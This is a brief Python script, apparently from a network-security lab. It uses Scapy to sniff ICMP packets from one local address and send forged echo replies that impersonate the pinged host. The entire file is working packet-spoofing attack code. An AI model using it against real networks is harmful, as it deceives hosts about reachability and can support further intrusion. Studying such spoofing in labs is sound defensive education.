from scapy.all import *

def spoof(pkt):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        ip.ttl=pkt[IP].ttl
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)

        if pkt.haslayer(Raw):
                data = pkt[Raw].load
                newpkt = ip/icmp/data
        else:
                newpkt = ip/icmp

        print("Spoofing Packet........")
        print("Source IP : ", newpkt[IP].src)
        print("Dest   IP : ", newpkt[IP].dst)

        send(newpkt, verbose=0)

pkt = sniff(filter='icmp and src 192.168.1.102', prn=spoof)
